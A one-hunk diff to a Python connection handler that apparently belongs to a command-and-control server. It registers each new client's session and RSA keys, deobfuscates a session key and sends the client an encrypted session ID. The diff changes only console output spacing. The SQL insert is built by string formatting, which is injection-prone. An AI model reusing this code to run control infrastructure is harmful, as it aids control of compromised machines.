@@ -797,7 +797,7 @@ class ClientHandler(threading.Thread):
         try:
             query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client_id','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
             session_id  = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'id': self.info['id']}).content
-            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
+            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
             ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
             self.connection.sendall(ciphertext + '\n')
             ciphertext  = ""
